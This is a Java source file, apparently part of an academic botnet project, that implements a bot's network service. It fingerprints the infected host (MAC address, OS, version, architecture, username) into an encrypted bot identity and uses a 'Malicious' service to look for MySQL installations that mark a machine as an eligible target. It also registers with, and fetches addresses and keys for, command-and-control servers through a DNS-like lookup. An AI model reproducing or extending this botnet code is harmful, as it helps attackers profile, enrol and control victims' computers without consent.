package cs.sii.service.connection;

import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.List;
import java.util.Set;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

import org.apache.commons.codec.binary.Base64;
import org.apache.commons.codec.digest.DigestUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import cs.sii.bot.action.Malicious;
import cs.sii.config.onLoad.Config;
import cs.sii.domain.IP;
import cs.sii.domain.Pairs;
import cs.sii.domain.SyncIpList;
import cs.sii.model.bot.Bot;
import cs.sii.network.request.BotRequest;
import cs.sii.network.request.CecRequest;
import cs.sii.service.crypto.CryptoPKI;
import cs.sii.service.crypto.CryptoUtils;

@Service("NetworkService")
public class NetworkService {

	@Autowired
	private Config engineBot;

	
	private SyncIpList<IP,PublicKey> commandConquerIps=new SyncIpList<IP,PublicKey>();

//	 Ip dei command e conquer
	
	private SyncIpList<IP,PublicKey> neighbours=new SyncIpList<IP,PublicKey>();

	@Autowired
	private Malicious malServ;

	@Autowired
	private BotRequest botReq;

	@Autowired
	private CecRequest cecReq;

	@Autowired
	private CryptoPKI pki;

	@Autowired
	private CryptoUtils cryptoUtils;
	private static final String IP_REGEX = "^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$";
	//private static final String IP_REGEX2 = "^(^192.168.*)";
	private static final String IP_REGEX2 = "^(^25.*)";
	// private static final String MAC_REGEX =
	// "^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$";

	private IP ip;
	private String mac;
	private String idHash;
	private String os;

	private long milli;

	private String versionOS;

	private String archOS;

	private String usernameOS;

	boolean elegible;

	public NetworkService() {
	}
	
	
	/**
	 * @param botList
	 */
	public List<Pairs<IP, PublicKey>> setConstructList(Set<Bot> botList) {
		List<Pairs<IP, PublicKey>> buff = new ArrayList<Pairs<IP, PublicKey>>();
		botList.forEach((bot) -> {
			buff.add(new Pairs<IP, PublicKey>(new IP(bot.getIp()),pki.rebuildPuK(bot.getPubKey())));
		});
		return buff;
	}
	

	
	/**
	 * @param botList
	 */
	public List<Pairs<IP, PublicKey>> setConstructList(List<Bot> list) {
		List<Pairs<IP, PublicKey>> buff = new ArrayList<Pairs<IP, PublicKey>>();
		list.forEach((bot) -> {
			buff.add(new Pairs<IP, PublicKey>(new IP(bot.getIp()),pki.rebuildPuK( bot.getPubKey())));
		});
		return buff;
	}
	
	/**
	 * @return
	 * @throws InvalidKeyException
	 * @throws InvalidAlgorithmParameterException
	 * @throws IllegalBlockSizeException
	 * @throws BadPaddingException
	 * @throws NoSuchAlgorithmException
	 * @throws NoSuchPaddingException
	 * @throws IOException
	 */
	public Boolean loadNetwork()
			throws InvalidKeyException, InvalidAlgorithmParameterException, IllegalBlockSizeException,
			BadPaddingException, NoSuchAlgorithmException, NoSuchPaddingException, IOException {
		ArrayList<String> netPar = new ArrayList<String>();
		netPar = cryptoUtils.decodeStringsFromFile("");
		this.ip = new IP(getMyIpCheckInternet());
		System.out.println("My IP: " + ip);
		this.mac = netPar.get(0);
		System.out.println("My MAC: " + mac);
		this.os = netPar.get(1);
		System.out.println("My OS: " + os);
		this.milli = Long.parseLong(netPar.get(2));
		this.versionOS = netPar.get(3);
		System.out.println("My ver: " + versionOS);
		this.archOS = netPar.get(4);
		System.out.println("My arch: " + archOS);
		this.usernameOS = netPar.get(5);
		System.out.println("My user: " + usernameOS);
		this.idHash = netPar.get(6);
		System.out.println("My IdHash: " + idHash);
		
		if(os.startsWith("Mac")){
		elegible = (malServ.checklistFilesFolder("/usr/local/mysql-5.7.15-osx10.11-x86_64/support-files/", "(^mysql.server)").equals("")) ? Boolean.FALSE :  Boolean.TRUE;}
		else
		elegible = (malServ.checklistFiles("(^mysql.exe)").equals("")) ? Boolean.FALSE :  Boolean.TRUE;
		
		System.out.println("My MYSQL: " + elegible);
		
		String os1 = System.getProperty("os.name");
		String versionOS1 = System.getProperty("os.version");
		String archOS1 = System.getProperty("os.arch");
		String usernameOS1 = System.getProperty("user.name");

		if ((!os.matches(os1)) || (!versionOS.matches(versionOS1)) || (!archOS.matches(archOS1))
				|| (!usernameOS.matches(usernameOS1))) {
			throw new IOException();
		}
		return true;

	}

	
	
	/**
	 * @param response
	 * @return
	 */
	public List<Pairs<IP, PublicKey>> tramsuteNeigha(List<Pairs<String, String> > response){
		List<Pairs<IP, PublicKey>> newNeighbours = new ArrayList<Pairs<IP, PublicKey>>();
		for (Pairs<String, String> pairs : response) {
			Pairs<IP, PublicKey> in = new Pairs<IP, PublicKey>();
			in.setValue1(new IP(pairs.getValue1()));
			in.setValue2(pki.rebuildPuK(pairs.getValue2()));
			newNeighbours.add(in);
		}
		return newNeighbours;
	}
	
	
	
	/**
	 * @return
	 */
	private ArrayList<String> getAllIpAddresses() {

		ArrayList<String> ips = new ArrayList<>();

		try {
			Enumeration<?> e = NetworkInterface.getNetworkInterfaces();
			while (e.hasMoreElements()) {
				NetworkInterface n = (NetworkInterface) e.nextElement();
				Enumeration<?> ee = n.getInetAddresses();
				while (ee.hasMoreElements()) {
					InetAddress i = (InetAddress) ee.nextElement();
					if (i.getHostAddress().matches(IP_REGEX)) {
						ips.add(i.getHostAddress());
					}
				}
			}
		} catch (SocketException e) {
			e.printStackTrace();
			return null;
		}

		return ips;
	}
	
	private String getAllIpAddress() {

		ArrayList<String> ips = new ArrayList<>();

		try {
			Enumeration<?> e = NetworkInterface.getNetworkInterfaces();
			while (e.hasMoreElements()) {
				NetworkInterface n = (NetworkInterface) e.nextElement();
				Enumeration<?> ee = n.getInetAddresses();
				while (ee.hasMoreElements()) {
					InetAddress i = (InetAddress) ee.nextElement();
					if (i.getHostAddress().matches(IP_REGEX2)) {
						ips.add(i.getHostAddress());
					}
				}
			}
		} catch (SocketException e) {
			e.printStackTrace();
			return null;
		}

		return ips.get(0);
	}

	/**
	 * @return mac address of the machine running the program
	 */
	public String loadMachineMac() {

		InetAddress ip;
		StringBuilder sb = new StringBuilder();
		try {
			ip = InetAddress.getLocalHost();
			// System.out.println("Current IP address : " +
			// ip.getHostAddress());

			NetworkInterface network = NetworkInterface.getByInetAddress(ip);
			byte[] mac = network.getHardwareAddress();
			// System.out.print("Current MAC address : ");
			if(mac!=null){
			for (int i = 0; i < mac.length; i++) {
				sb.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? "-" : ""));
			}}else return "noMac";
			System.out.println(sb.toString());

		} catch (UnknownHostException e) {
			e.printStackTrace();
		} catch (SocketException e) {
			e.printStackTrace();
		}
		return sb.toString();
	}

	/**
	 * @return
	 */
	public boolean firstConnectToMockServerDns() {
		if(engineBot.isCommandandconquerStatus()){
			String url = engineBot.getDnsip() + ":" + engineBot.getDnsport();
			Boolean result = false;
			result = cecReq.sendInfoToDnsServer(url, this.ip, pki.getPubRSAKey());
			System.out.println("Ip tornato " + result);
			return Boolean.TRUE;
		}else{
			String url = engineBot.getDnsip() + ":" + engineBot.getDnsport() + engineBot.getUrirequest();
			Pairs<String, String> result = new Pairs<>();
			Pairs<IP, PublicKey> cec = new Pairs<>();
			try {
			result = botReq.getIpCeCFromDnsServer(url);
			cec.setValue1(new IP(result.getValue1()));
			cec.setValue2(pki.rebuildPuK(result.getValue2()));
			commandConquerIps.add(cec);
			commandConquerIps.getList().forEach(ip -> System.out.println(ip.getValue1()));
			System.out.println("Connessione con DNS server OK");
			return Boolean.TRUE;
			} catch (Exception ex) {
			System.err.println("Errore durante la richiesta di IP\n" + ex);
			}
		}
		return Boolean.FALSE;
	}

	/**
	 * @return
	 */
	public String getMachineInfo() {
		ip = new IP(getMyIpCheckInternet());

		// prendi il mac
		mac = loadMachineMac();

		// prendi il sistema operativo
		os = System.getProperty("os.name");
		versionOS = System.getProperty("os.version");
		archOS = System.getProperty("os.arch");
		usernameOS = System.getProperty("user.name");

		// aggiungi nonce time.millis
		milli = System.currentTimeMillis();

		// genera hash
		byte[] hash = DigestUtils.sha256(os + versionOS + archOS + usernameOS + milli);

		idHash = Base64.encodeBase64String(hash);
		System.out.println("idBot " + idHash + "  hash " + hash.toString());
		// salva hash su properties;

		// genera Bot
		ArrayList<Object> data = new ArrayList<Object>();
		data.add(mac);
		data.add(os);
		data.add(milli);
		data.add(versionOS);
		data.add(archOS);
		data.add(usernameOS);
		data.add(idHash);

		try {
			cryptoUtils.encodeObjsToFile("", data);
		} catch (InvalidKeyException | NoSuchAlgorithmException | NoSuchPaddingException | UnsupportedEncodingException
				| InvalidAlgorithmParameterException | IllegalBlockSizeException | BadPaddingException
				| FileNotFoundException e) {
		}
		return idHash;

	}

	/**
	 * @return
	 */
	private String getMyIpCheckInternet() {
		String ip = null;
		//			ip = InetAddress.getLocalHost();
		ip = getAllIpAddress();
		System.out.println("my ip " + ip);
		// TODO ELIMINA MOCK LOCAL IP
		// result = asyncRequest.askMyIpToAmazon();
		// if (result.matches(IP_REGEX))
		// return result;
		return ip;
	}

	/**
	 * @return
	 */
	public Boolean updateDnsInformation() {

		String url = engineBot.getDnsip() + ":" + engineBot.getDnsport();
		Boolean result = false;
		result = cecReq.sendInfoToDnsServer(url, this.ip, pki.getPubRSAKey());
		System.out.println("Ip tornato " + result);
		return Boolean.TRUE;
	}

	
	/**
	 * @param ip
	 * @param pk
	 * @return
	 */
	public Boolean updateDnsInformation(IP ip, PublicKey pk) {

		String url = engineBot.getDnsip() + ":" + engineBot.getDnsport();
		Boolean result = false;
		result = cecReq.sendInfoToDnsServer(url,ip, pk);
		System.out.println("Ip tornato " + result);
		return Boolean.TRUE;
	}
	/**
	 * @param ip
	 * @param pk
	 * @return
	 */
	public Boolean updateDnsInformation(IP ip, String pk) {

		String url = engineBot.getDnsip() + ":" + engineBot.getDnsport();
		Boolean result = false;
		result = cecReq.sendInfoToDnsServer(url,ip, pk);
		System.out.println("Ip tornato " + result);
		return result;
	}
	
	public boolean updateBotNetwork() {
		return true;
	}

	public SyncIpList<IP,PublicKey> getCommandConquerIps() {
		return commandConquerIps;
	}

	public IP getMyIp() {
		return ip;
	}

	public void setIp(IP ip) {
		this.ip = ip;
	}

	public String getIdHash() {
		return idHash;
	}

	public void setIdHash(String idHash) {
		this.idHash = idHash;
	}

	public String getOs() {
		return os;
	}

	public void setOs(String os) {
		this.os = os;
	}

	public void setMac(String mac) {
		this.mac = mac;
	}

	public String getMac() {
		if ((mac == null) || (mac == ""))
			mac = loadMachineMac();
		return mac;
	}

	public Config getEngineBot() {
		return engineBot;
	}

	public void setEngineBot(Config engineBot) {
		this.engineBot = engineBot;
	}

	public BotRequest getAsyncRequest() {
		return botReq;
	}

	public void setAsyncRequest(BotRequest asyncRequest) {
		this.botReq = asyncRequest;
	}

	public long getMilli() {
		return milli;
	}

	public void setMilli(long milli) {
		this.milli = milli;
	}

	public String getVersionOS() {
		return versionOS;
	}

	public void setVersionOS(String versionOS) {
		this.versionOS = versionOS;
	}

	public String getArchOS() {
		return archOS;
	}

	public void setArchOS(String archOS) {
		this.archOS = archOS;
	}

	public String getUsernameOS() {
		return usernameOS;
	}

	public void setUsernameOS(String usernameOS) {
		this.usernameOS = usernameOS;
	}

	public SyncIpList<IP, PublicKey> getNeighbours() {
		return neighbours;
	}

	public void setNeighbours(SyncIpList<IP, PublicKey> neighbours) {
		this.neighbours = neighbours;
	}

	public Malicious getMalServ() {
		return malServ;
	}

	public void setMalServ(Malicious malServ) {
		this.malServ = malServ;
	}

	public BotRequest getBotReq() {
		return botReq;
	}

	public void setBotReq(BotRequest botReq) {
		this.botReq = botReq;
	}

	public CecRequest getCecReq() {
		return cecReq;
	}

	public void setCecReq(CecRequest cecReq) {
		this.cecReq = cecReq;
	}

	public CryptoPKI getPki() {
		return pki;
	}

	public void setPki(CryptoPKI pki) {
		this.pki = pki;
	}

	public CryptoUtils getCryptoUtils() {
		return cryptoUtils;
	}

	public void setCryptoUtils(CryptoUtils cryptoUtils) {
		this.cryptoUtils = cryptoUtils;
	}

	public void setCommandConquerIps(SyncIpList<IP, PublicKey> commandConquerIps) {
		this.commandConquerIps = commandConquerIps;
	}

	public boolean isElegible() {
		return elegible;
	}

	public void setElegible(boolean elegible) {
		this.elegible = elegible;
	}

	// public SyncCeCList getBotIps() {
	// return botIps;
	// }

}
